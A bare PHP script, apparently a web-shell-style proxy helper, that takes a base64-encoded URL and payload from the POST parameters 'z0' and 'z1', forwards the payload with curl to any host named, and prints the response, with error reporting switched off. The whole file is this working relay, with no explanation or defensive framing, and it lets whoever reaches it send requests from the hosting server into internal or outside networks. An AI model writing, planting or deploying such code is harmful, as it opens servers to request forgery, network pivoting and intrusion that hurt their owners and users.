<?php

error_reporting(0);
header('Content-Type: text/plain');

function is_binary(string $data): bool 
{
    return (bool) preg_match('~[^\x20-\x7E\t\r\n]~', $data);
}

function http_post(string $url, $data, int &$http_code)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);

    $contentType = is_binary($data) 
        ? 'Content-Type: application/octet-stream' 
        : 'Content-Type: application/x-www-form-urlencoded';

    curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        $contentType,
    ]);

    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $response;
}

$z0 = $_POST['z0'] ?? '';
$z1 = $_POST['z1'] ?? '';

$url  = base64_decode($z0);
$data = base64_decode($z1);

$http_code = 0;
if ($url !== '') {
    $body = http_post($url, $data, $http_code);
    echo $body;
}

?>